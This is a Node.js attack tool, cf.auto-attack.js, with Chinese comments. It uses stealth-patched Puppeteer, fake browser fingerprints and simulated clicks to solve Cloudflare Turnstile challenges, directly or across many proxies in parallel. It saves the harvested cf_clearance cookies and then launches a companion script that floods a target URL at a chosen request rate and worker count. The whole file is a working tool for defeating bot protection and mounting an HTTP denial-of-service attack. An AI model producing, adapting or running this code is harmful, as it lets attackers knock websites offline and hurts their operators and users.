#!/usr/bin/env node
// cf.auto-attack.js - 自动获取 Cookie 并启动攻击的一体化工具
// 支持直连模式（不使用代理）

const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const fs = require('fs');
const path = require('path');
const cluster = require('cluster');
const os = require('os');
const { spawn } = require('child_process');
const readline = require('readline');

function getBrowserPath() {
    const paths = os.platform() === 'win32' 
        ? ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 
           'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
           'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
           'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe']
        : ['/usr/bin/google-chrome', '/usr/bin/chromium-browser', '/usr/bin/chromium', '/usr/bin/microsoft-edge'];
    return paths.find(p => fs.existsSync(p)) || null;
}

const C = {
    reset: "\x1b[0m", gray: "\x1b[90m", cyan: "\x1b[36m", yellow: "\x1b[33m",
    magenta: "\x1b[35m", green: "\x1b[32m", white: "\x1b[37m", blue: "\x1b[34m", red: "\x1b[31m"
};

function ts() { 
    return new Date().toISOString().replace('T', ' ').split('.')[0]; 
}

function sleep(ms) { 
    return new Promise(r => setTimeout(r, ms)); 
}

// ============================================================
// 命令行参数解析
// ============================================================
const args = process.argv.slice(2);

if (args.length < 4) {
    console.log(`${C.cyan}cf.auto-attack.js - 自动获取 Cookie 并启动攻击${C.reset}\n`);
    console.log(`用法: node cf.auto-attack.js <url> <duration> <workers> <qps> [options]\n`);
    console.log(`参数:`);
    console.log(`  url              目标 URL`);
    console.log(`  duration         持续时间（秒）`);
    console.log(`  workers          Worker 进程数`);
    console.log(`  qps              每秒请求数\n`);
    console.log(`选项:`);
    console.log(`  --direct         直连模式（不使用代理）`);
    console.log(`  --proxy=file     使用代理文件`);
    console.log(`  --parallel=N     Cookie 获取并行数（默认: 10）`);
    console.log(`  --headless       无头模式`);
    console.log(`  --debug          调试模式\n`);
    console.log(`示例:`);
    console.log(`  ${C.gray}# 直连模式${C.reset}`);
    console.log(`  node cf.auto-attack.js https://target.com 120 16 1000 --direct\n`);
    console.log(`  ${C.gray}# 代理模式${C.reset}`);
    console.log(`  node cf.auto-attack.js https://target.com 120 16 1000 --proxy=proxy.txt --parallel=50\n`);
    process.exit(1);
}

const targetUrl = args[0];
const duration = parseInt(args[1]);
const workers = parseInt(args[2]);
const qps = parseInt(args[3]);

const directMode = args.includes('--direct');
const proxyFlag = args.find(a => a.startsWith('--proxy='));
const proxyFile = proxyFlag ? proxyFlag.split('=')[1] : null;
const parallelFlag = args.find(a => a.startsWith('--parallel='));
const parallel = parallelFlag ? parseInt(parallelFlag.split('=')[1]) : 10;
const headlessMode = args.includes('--headless');
const debugMode = args.includes('--debug');

if (!directMode && !proxyFile) {
    console.error(`${C.red}错误: 必须指定 --direct 或 --proxy=file${C.reset}`);
    process.exit(1);
}

if (proxyFile && !fs.existsSync(proxyFile)) {
    console.error(`${C.red}错误: 代理文件不存在: ${proxyFile}${C.reset}`);
    process.exit(1);
}

console.log(`${C.cyan}=== 自动攻击系统 ===${C.reset}`);
console.log(`${C.green}目标:${C.reset} ${C.white}${targetUrl}${C.reset}`);
console.log(`${C.green}持续时间:${C.reset} ${C.white}${duration}s${C.reset}`);
console.log(`${C.green}Workers:${C.reset} ${C.white}${workers}${C.reset}`);
console.log(`${C.green}QPS:${C.reset} ${C.white}${qps}${C.reset}`);
console.log(`${C.green}模式:${C.reset} ${C.white}${directMode ? '直连' : '代理'}${C.reset}`);
if (proxyFile) {
    const proxyList = fs.readFileSync(proxyFile, 'utf8').split(/\r?\n/).filter(s => s.trim() && !s.startsWith('#'));
    console.log(`${C.green}代理数量:${C.reset} ${C.white}${proxyList.length}${C.reset}`);
    console.log(`${C.green}并行数:${C.reset} ${C.white}${parallel}${C.reset}`);
}
console.log(`${C.green}无头模式:${C.reset} ${C.white}${headlessMode ? '是' : '否'}${C.reset}\n`);

// ============================================================
// 阶段 1: 获取 Cookie
// ============================================================

console.log(`${C.yellow}[阶段 1/2] 获取 Cookie...${C.reset}\n`);

// Linux 内存优化
if (process.platform === 'linux') {
    try {
        process.env.TMPDIR = '/dev/shm';
        process.env.XDG_CACHE_HOME = '/dev/shm';
    } catch (_) {}
}

const launchArgs = [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-gpu',
    '--disable-infobars',
    '--disable-features=WebRtcHideLocalIpsWithMdns,PrivacySandboxAdsAPIs',
    '--disable-blink-features=AutomationControlled',
    '--disk-cache-size=0',
    '--media-cache-size=0',
    '--disable-application-cache',
    '--disable-offline-load-stale-cache'
];

function pickUA() {
    const chromeMajors = [120, 121, 122, 123, 124, 125];
    const major = chromeMajors[Math.floor(Math.random() * chromeMajors.length)];
    const full = `${major}.0.0.0`;
    return {
        ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${full} Safari/537.36`,
        major,
        full
    };
}

async function getCookieDirect() {
    // 如果正在关闭，直接返回
    if (isShuttingDown) {
        return null;
    }
    
    let browser = null;
    let page = null;
    let capturedHeaders = null;
    let challengeToken = null;
    let redirectUrl = null;
    
    try {
        if (debugMode) console.log(`${C.gray}[${ts()}]${C.reset} 启动浏览器（直连模式）`);
        
        const picked = pickUA();
        const browserPath = getBrowserPath();
        
        if (!browserPath) {
            throw new Error('未找到 Chrome 或 Edge 浏览器，请安装后重试');
        }
        
        browser = await puppeteer.launch({
            headless: headlessMode ? 'new' : false,
            defaultViewport: null,
            executablePath: browserPath,
            ignoreDefaultArgs: headlessMode ? ['--enable-automation'] : undefined,
            timeout: 60000,
            args: launchArgs
        });
        
        // 注册浏览器进程
        registerBrowser(browser);
        
        const pages = await browser.pages();
        page = pages[0] || await browser.newPage();
        
        await page.setUserAgent(picked.ua);
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Sec-CH-UA': `"Chromium";v="${picked.major}", "Google Chrome";v="${picked.major}", "Not=A?Brand";v="99"`,
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"'
        });
        
        // 捕获浏览器发送的真实请求头
        await page.setRequestInterception(true);
        page.on('request', request => {
            const url = request.url();
            // 捕获主页面请求的头部
            if (url === targetUrl && !capturedHeaders) {
                capturedHeaders = request.headers();
                if (debugMode) {
                    console.log(`${C.gray}[${ts()}]${C.reset} 捕获浏览器真实请求头:`);
                    console.log(JSON.stringify(capturedHeaders, null, 2));
                }
            }
            request.continue();
        });
        
        let lastStatusCode = null;
        page.on('response', resp => {
            try {
                const req = resp.request();
                if (req && req.isNavigationRequest() && req.frame() === page.mainFrame()) {
                    lastStatusCode = resp.status();
                    // 捕获重定向 URL（包含挑战令牌）
                    const respUrl = resp.url();
                    if (respUrl.includes('__cf_chl_tk=')) {
                        redirectUrl = respUrl;
                        const match = respUrl.match(/__cf_chl_tk=([^&]+)/);
                        if (match) {
                            challengeToken = match[1];
                            if (debugMode) {
                                console.log(`${C.gray}[${ts()}]${C.reset} 捕获挑战令牌: ${challengeToken.substring(0, 30)}...`);
                            }
                        }
                    }
                }
            } catch (_) {}
        });
        
        if (debugMode) console.log(`${C.gray}[${ts()}]${C.reset} 访问目标: ${targetUrl}`);
        const resp = await page.goto(targetUrl, { 
            waitUntil: 'domcontentloaded', 
            timeout: 30000 
        });
        
        if (resp) lastStatusCode = resp.status();
        
        // 自动调整视口
        try {
            const { w, h } = await page.evaluate(() => {
                const el = document.documentElement;
                return { w: el.clientWidth || 1280, h: el.clientHeight || 800 };
            });
            await page.setViewport({ width: w, height: h });
        } catch (_) {}
        
        const initialCookies = await page.cookies();
        const initialClearance = initialCookies.find(x => x.name === 'cf_clearance');
        const initialValue = initialClearance ? initialClearance.value : null;
        
        // 查找验证框
        async function findCfWidget() {
            const frames = page.frames();
            const cfFrame = frames.find(f => 
                f.url().includes('challenges') || 
                f.url().includes('turnstile')
            );
            
            if (!cfFrame) return null;
            
            try {
                const el = await cfFrame.frameElement();
                const box = await el.boundingBox();
                if (!box) return null;
                
                return {
                    rect: box,
                    checkboxPoint: {
                        x: box.x + box.width * 0.18,
                        y: box.y + box.height * 0.5
                    }
                };
            } catch (_) {
                return null;
            }
        }
        
        // 验证阶段（最多 30 秒）
        const solveDeadline = Date.now() + 30000;
        let solved = false;
        let clickCount = 0;
        
        console.log(`${C.yellow}等待验证...${C.reset}`);
        
        while (Date.now() < solveDeadline) {
            const cookies = await page.cookies();
            const clearance = cookies.find(x => x.name === 'cf_clearance');
            const widget = await findCfWidget();
            
            // 成功判定
            if (clearance && 
                clearance.value !== initialValue && 
                !widget && 
                (lastStatusCode === 200 || lastStatusCode === 304)) {
                solved = true;
                console.log(`${C.green}✓ 验证成功! Cookie: ${clearance.value.substring(0, 20)}...${C.reset}`);
                break;
            }
            
            // 点击验证框
            if (widget) {
                const now = Date.now();
                if (now - (page._lastClickTs || 0) > 1500) {
                    clickCount++;
                    const cx = widget.checkboxPoint.x + (Math.random() * 4 - 2);
                    const cy = widget.checkboxPoint.y + (Math.random() * 4 - 2);
                    
                    if (debugMode) console.log(`${C.gray}[${ts()}]${C.reset} 点击验证框 #${clickCount}`);
                    
                    try {
                        await page.mouse.move(cx, cy);
                        await page.mouse.down();
                        await sleep(50 + Math.random() * 50);
                        await page.mouse.up();
                        page._lastClickTs = now;
                        await page.waitForNavigation({ 
                            waitUntil: 'domcontentloaded', 
                            timeout: 3000 
                        }).catch(() => {});
                    } catch (_) {}
                }
            } else if (headlessMode) {
                // 无头模式备用逻辑
                const frames = page.frames();
                const cfFrame = frames.find(f => f.url().includes('turnstile'));
                if (cfFrame) {
                    try {
                        const checkbox = await cfFrame.$('input[type="checkbox"]');
                        if (checkbox) {
                            await checkbox.click();
                            await sleep(1000);
                        }
                    } catch (_) {}
                }
            }
            
            await sleep(200);
        }
        
        if (!solved) {
            console.log(`${C.red}✗ 验证超时${C.reset}`);
            await browser.close();
            return null;
        }
        
        // 获取最终 Cookie
        const finalCookies = await page.cookies();
        const cfClearance = finalCookies.find(x => x.name === 'cf_clearance');
        
        if (!cfClearance) {
            console.log(`${C.red}✗ Cookie 丢失${C.reset}`);
            await browser.close();
            return null;
        }
        
        // 构建完整 Cookie 字符串
        const cookieString = finalCookies
            .map(c => `${c.name}=${c.value}`)
            .join('; ');
        
        // 获取页面标题
        const title = await page.title();
        
        // 注销并关闭浏览器
        unregisterBrowser(browser);
        await browser.close();
        
        return {
            proxy: 'direct',
            cookie: cookieString,
            cf_clearance: cfClearance.value,
            title: title,
            status: lastStatusCode,
            timestamp: new Date().toISOString(),
            headers: capturedHeaders || {},
            challengeToken: challengeToken,
            redirectUrl: redirectUrl
        };
        
    } catch (err) {
        console.error(`${C.red}✗ 获取失败: ${err.message}${C.reset}`);
        if (browser) {
            try { 
                unregisterBrowser(browser);
                await browser.close(); 
            } catch (_) {}
        }
        return null;
    }
}

async function getCookieWithProxy(proxyStr) {
    // 如果正在关闭，直接返回
    if (isShuttingDown) {
        return null;
    }
    
    let browser = null;
    let page = null;
    let capturedHeaders = null;
    let challengeToken = null;
    let redirectUrl = null;
    
    try {
        const proxyUrl = proxyStr.startsWith('http') ? proxyStr : `http://${proxyStr}`;
        if (debugMode) console.log(`${C.gray}[${ts()}]${C.reset} 处理代理: ${proxyUrl}`);
        
        const picked = pickUA();
        const browserPath = getBrowserPath();
        
        if (!browserPath) {
            throw new Error('未找到 Chrome 或 Edge 浏览器，请安装后重试');
        }
        
        browser = await puppeteer.launch({
            headless: headlessMode ? 'new' : false,
            defaultViewport: null,
            executablePath: browserPath,
            ignoreDefaultArgs: headlessMode ? ['--enable-automation'] : undefined,
            timeout: 60000,
            args: [...launchArgs, `--proxy-server=${proxyUrl}`]
        });
        
        // 注册浏览器进程
        registerBrowser(browser);
        
        const pages = await browser.pages();
        page = pages[0] || await browser.newPage();
        
        await page.setUserAgent(picked.ua);
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Sec-CH-UA': `"Chromium";v="${picked.major}", "Google Chrome";v="${picked.major}", "Not=A?Brand";v="99"`,
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"'
        });
        
        // 捕获浏览器发送的真实请求头
        await page.setRequestInterception(true);
        page.on('request', request => {
            const url = request.url();
            if (url === targetUrl && !capturedHeaders) {
                capturedHeaders = request.headers();
            }
            request.continue();
        });
        
        let lastStatusCode = null;
        page.on('response', resp => {
            try {
                const req = resp.request();
                if (req && req.isNavigationRequest() && req.frame() === page.mainFrame()) {
                    lastStatusCode = resp.status();
                    // 捕获重定向 URL（包含挑战令牌）
                    const respUrl = resp.url();
                    if (respUrl.includes('__cf_chl_tk=')) {
                        redirectUrl = respUrl;
                        const match = respUrl.match(/__cf_chl_tk=([^&]+)/);
                        if (match) {
                            challengeToken = match[1];
                            if (debugMode) {
                                console.log(`${C.gray}[${ts()}]${C.reset} 捕获挑战令牌: ${challengeToken.substring(0, 30)}...`);
                            }
                        }
                    }
                }
            } catch (_) {}
        });
        
        const resp = await page.goto(targetUrl, { 
            waitUntil: 'domcontentloaded', 
            timeout: 30000 
        });
        
        if (resp) lastStatusCode = resp.status();
        
        try {
            const { w, h } = await page.evaluate(() => {
                const el = document.documentElement;
                return { w: el.clientWidth || 1280, h: el.clientHeight || 800 };
            });
            await page.setViewport({ width: w, height: h });
        } catch (_) {}
        
        const initialCookies = await page.cookies();
        const initialClearance = initialCookies.find(x => x.name === 'cf_clearance');
        const initialValue = initialClearance ? initialClearance.value : null;
        
        async function findCfWidget() {
            const frames = page.frames();
            const cfFrame = frames.find(f => 
                f.url().includes('challenges') || 
                f.url().includes('turnstile')
            );
            
            if (!cfFrame) return null;
            
            try {
                const el = await cfFrame.frameElement();
                const box = await el.boundingBox();
                if (!box) return null;
                
                return {
                    rect: box,
                    checkboxPoint: {
                        x: box.x + box.width * 0.18,
                        y: box.y + box.height * 0.5
                    }
                };
            } catch (_) {
                return null;
            }
        }
        
        const solveDeadline = Date.now() + 30000;
        let solved = false;
        let clickCount = 0;
        
        while (Date.now() < solveDeadline) {
            const cookies = await page.cookies();
            const clearance = cookies.find(x => x.name === 'cf_clearance');
            const widget = await findCfWidget();
            
            if (clearance && 
                clearance.value !== initialValue && 
                !widget && 
                (lastStatusCode === 200 || lastStatusCode === 304)) {
                solved = true;
                if (debugMode) console.log(`${C.green}✓ ${proxyStr} 验证成功${C.reset}`);
                break;
            }
            
            if (widget) {
                const now = Date.now();
                if (now - (page._lastClickTs || 0) > 1500) {
                    clickCount++;
                    const cx = widget.checkboxPoint.x + (Math.random() * 4 - 2);
                    const cy = widget.checkboxPoint.y + (Math.random() * 4 - 2);
                    
                    try {
                        await page.mouse.move(cx, cy);
                        await page.mouse.down();
                        await sleep(50 + Math.random() * 50);
                        await page.mouse.up();
                        page._lastClickTs = now;
                        await page.waitForNavigation({ 
                            waitUntil: 'domcontentloaded', 
                            timeout: 3000 
                        }).catch(() => {});
                    } catch (_) {}
                }
            } else if (headlessMode) {
                const frames = page.frames();
                const cfFrame = frames.find(f => f.url().includes('turnstile'));
                if (cfFrame) {
                    try {
                        const checkbox = await cfFrame.$('input[type="checkbox"]');
                        if (checkbox) {
                            await checkbox.click();
                            await sleep(1000);
                        }
                    } catch (_) {}
                }
            }
            
            await sleep(200);
        }
        
        if (!solved) {
            unregisterBrowser(browser);
            await browser.close();
            return null;
        }
        
        const finalCookies = await page.cookies();
        const cfClearance = finalCookies.find(x => x.name === 'cf_clearance');
        
        if (!cfClearance) {
            unregisterBrowser(browser);
            await browser.close();
            return null;
        }
        
        const cookieString = finalCookies
            .map(c => `${c.name}=${c.value}`)
            .join('; ');
        
        const title = await page.title();
        
        // 注销并关闭浏览器
        unregisterBrowser(browser);
        await browser.close();
        
        return {
            proxy: proxyStr,
            cookie: cookieString,
            cf_clearance: cfClearance.value,
            title: title,
            status: lastStatusCode,
            timestamp: new Date().toISOString(),
            headers: capturedHeaders || {},
            challengeToken: challengeToken,
            redirectUrl: redirectUrl
        };
        
    } catch (err) {
        if (debugMode) console.error(`${C.red}✗ ${proxyStr} 失败: ${err.message}${C.reset}`);
        if (browser) {
            try { 
                unregisterBrowser(browser);
                await browser.close(); 
            } catch (_) {}
        }
        return null;
    }
}

// ============================================================
// 启动攻击函数
// ============================================================

let attackProcess = null;

function startAttack(cookiePairs) {
    // 如果已经启动过，直接返回
    if (attackProcess) {
        return;
    }
    
    console.log(`\n${C.yellow}[阶段 2/2] 启动攻击...${C.reset}`);
    
    // 启动 cf.bypass.v3.js
    const attackArgs = [
        'cf.bypass.v3.js',
        targetUrl,
        duration.toString(),
        workers.toString(),
        qps.toString(),
        'auto-pairs.json'
    ];
    
    // 传递 debug 标志
    if (debugMode) {
        attackArgs.push('--debug');
    }
    
    attackProcess = spawn('node', attackArgs, {
        stdio: ['ignore', 'pipe', 'pipe'],
        cwd: __dirname
    });
    
    // 只显示攻击进程的统计信息，过滤掉其他输出
    let lastLine = '';
    attackProcess.stdout.on('data', (data) => {
        const lines = data.toString().split('\n');
        for (const line of lines) {
            if (line.includes('QPS:') || line.includes('Starting attack') || line.includes('Attack finished')) {
                // 清除上一行
                if (lastLine) {
                    readline.clearLine(process.stdout, 0);
                    readline.cursorTo(process.stdout, 0);
                }
                process.stdout.write(line + '\n');
                lastLine = line;
            }
        }
    });
    
    attackProcess.on('exit', async (code) => {
        console.log(`\n${C.gray}攻击进程退出，代码: ${code}${C.reset}`);
        
        // 攻击结束后，清理资源并退出
        setTimeout(async () => {
            await cleanup();
            process.exit(0);
        }, 2000);
    });
}

// 全局浏览器进程跟踪
const activeBrowsers = new Set();
let isShuttingDown = false;

// 注册浏览器进程
function registerBrowser(browser) {
    if (isShuttingDown) {
        // 如果正在关闭，立即关闭新启动的浏览器
        browser.close().catch(() => {});
        return;
    }
    activeBrowsers.add(browser);
}

// 注销浏览器进程
function unregisterBrowser(browser) {
    activeBrowsers.delete(browser);
}

// 清理所有资源
async function cleanup() {
    isShuttingDown = true;
    console.log(`\n${C.cyan}清理资源中...${C.reset}`);
    
    // 关闭攻击进程
    if (attackProcess) {
        try {
            attackProcess.kill('SIGTERM');
        } catch (err) {}
    }
    
    // 等待一下，让正在启动的浏览器完成注册
    await new Promise(resolve => setTimeout(resolve, 500));
    
    // 关闭所有跟踪的浏览器进程
    if (activeBrowsers.size > 0) {
        console.log(`${C.gray}关闭 ${activeBrowsers.size} 个跟踪的浏览器进程...${C.reset}`);
        const browsers = Array.from(activeBrowsers);
        activeBrowsers.clear();
        
        await Promise.all(browsers.map(async (browser) => {
            try {
                await browser.close();
            } catch (err) {}
        }));
    }
    
    // 再等待一下，确保所有浏览器进程都已关闭
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // 强制清理所有 Chrome/Chromium 进程（Linux）
    if (os.platform() !== 'win32') {
        try {
            const { exec } = require('child_process');
            console.log(`${C.gray}强制清理残留的浏览器进程...${C.reset}`);
            
            // 使用多个命令确保清理干净
            const killCommands = [
                'pkill -9 -f chrome',
                'pkill -9 -f chromium',
                'killall -9 chrome 2>/dev/null',
                'killall -9 chromium 2>/dev/null'
            ];
            
            for (const cmd of killCommands) {
                await new Promise((resolve) => {
                    exec(cmd, () => resolve());
                });
            }
            
            console.log(`${C.gray}已清理残留进程${C.reset}`);
        } catch (err) {}
    }
    
    console.log(`${C.green}✓ 清理完成${C.reset}`);
}

// 捕获退出信号，确保优雅退出
process.on('SIGINT', () => {
    console.log(`\n${C.yellow}收到退出信号 (Ctrl+C)${C.reset}`);
    cleanup().then(() => {
        process.exit(0);
    }).catch(() => {
        process.exit(1);
    });
});

process.on('SIGTERM', () => {
    console.log(`\n${C.yellow}收到终止信号${C.reset}`);
    cleanup().then(() => {
        process.exit(0);
    }).catch(() => {
        process.exit(1);
    });
});

// 捕获未处理的异常
process.on('uncaughtException', (err) => {
    console.error(`\n${C.red}未捕获的异常: ${err.message}${C.reset}`);
    cleanup().then(() => {
        process.exit(1);
    }).catch(() => {
        process.exit(1);
    });
});

// ============================================================
// 主流程
// ============================================================

(async () => {
    let cookiePairs = [];
    
    if (directMode) {
        // 直连模式：只获取一个 Cookie
        const result = await getCookieDirect();
        if (result) {
            cookiePairs.push(result);
            console.log(`${C.green}✓ Cookie 获取成功${C.reset}\n`);
        } else {
            console.error(`${C.red}✗ Cookie 获取失败，退出${C.reset}`);
            process.exit(1);
        }
    } else {
        // 代理模式：批量获取，边获取边启动
        const proxyList = fs.readFileSync(proxyFile, 'utf8')
            .split(/\r?\n/)
            .map(s => s.trim())
            .filter(s => s && !s.startsWith('#'));
        
        console.log(`${C.yellow}开始批量获取 ${proxyList.length} 个代理的 Cookie...${C.reset}\n`);
        
        const results = [];
        let processed = 0;
        let success = 0;
        let failed = 0;
        let attackStarted = false;
        
        // 并行处理
        const chunks = [];
        for (let i = 0; i < proxyList.length; i += parallel) {
            chunks.push(proxyList.slice(i, i + parallel));
        }
        
        for (const chunk of chunks) {
            const promises = chunk.map(proxy => getCookieWithProxy(proxy));
            const chunkResults = await Promise.all(promises);
            
            for (const result of chunkResults) {
                processed++;
                if (result) {
                    success++;
                    results.push(result);
                    
                    // 一旦有第一个 Cookie 成功，立即启动攻击
                    if (!attackStarted && success === 1) {
                        attackStarted = true;
                        console.log(`\n\n${C.green}✓ 首个 Cookie 获取成功，立即启动攻击！${C.reset}`);
                        console.log(`${C.yellow}继续在后台获取剩余 Cookie...${C.reset}`);
                        console.log(`${C.gray}${'='.repeat(60)}${C.reset}\n`);
                        
                        // 保存当前已有的 Cookie
                        fs.writeFileSync('auto-pairs.json', JSON.stringify(results, null, 2));
                        
                        // 立即启动攻击进程
                        startAttack(results);
                        
                        // 等待一下让攻击进程输出完成
                        await sleep(1000);
                        console.log(`\n${C.gray}${'='.repeat(60)}${C.reset}`);
                        console.log(`${C.cyan}Cookie 获取进度:${C.reset}\n`);
                    }
                } else {
                    failed++;
                }
                
                const progress = ((processed / proxyList.length) * 100).toFixed(1);
                const successRate = ((success / processed) * 100).toFixed(1);
                
                // 如果攻击已启动，在新行显示进度
                if (attackStarted) {
                    console.log(`${C.gray}[${ts()}]${C.reset} Cookie 进度: ${processed}/${proxyList.length} (${progress}%) | 成功: ${success} | 失败: ${failed}`);
                } else {
                    process.stdout.write(`\r${C.gray}[${ts()}]${C.reset} 进度: ${processed}/${proxyList.length} (${progress}%) | 成功: ${success} | 失败: ${failed} | 成功率: ${successRate}%   `);
                }
            }
        }
        
        console.log(`\n\n${C.gray}${'='.repeat(60)}${C.reset}`);
        console.log(`${C.green}✓ Cookie 获取完成: ${success}/${proxyList.length}${C.reset}`);
        console.log(`${C.gray}${'='.repeat(60)}${C.reset}\n`);
        
        if (success === 0) {
            console.error(`${C.red}✗ 没有成功获取任何 Cookie，退出${C.reset}`);
            process.exit(1);
        }
        
        cookiePairs = results;
        
        // 如果攻击已经启动，更新 Cookie 文件
        if (attackStarted) {
            console.log(`${C.cyan}✓ 更新 Cookie 配对: auto-pairs.json (${success} 个 Cookie)${C.reset}`);
            console.log(`${C.yellow}攻击进程将自动使用新增的 Cookie${C.reset}\n`);
            fs.writeFileSync('auto-pairs.json', JSON.stringify(cookiePairs, null, 2));
        }
    }
    
    // 如果是直连模式或攻击未启动，保存并启动
    if (!attackProcess) {
        // 保存 Cookie 配对
        const pairsFile = 'auto-pairs.json';
        fs.writeFileSync(pairsFile, JSON.stringify(cookiePairs, null, 2));
        console.log(`${C.cyan}Cookie 配对已保存: ${pairsFile}${C.reset}\n`);
        
        // 启动攻击
        startAttack(cookiePairs);
    }
})();
